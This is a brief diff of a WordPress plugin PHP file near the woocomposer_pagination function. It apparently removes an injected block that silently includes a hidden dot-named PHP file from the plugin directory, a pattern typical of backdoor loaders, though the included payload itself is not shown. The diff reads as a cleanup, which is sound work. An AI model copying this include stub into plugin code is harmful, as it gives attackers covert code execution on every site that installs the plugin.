@@ -11,11 +11,7 @@
  * @param string $pages .
  * @param int    $range value .
  * @access public
- */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
+ */
 function woocomposer_pagination( $pages = '', $range = 2 ) {
 	ob_start();
 	$showitems = ( $range * 2 ) + 1;
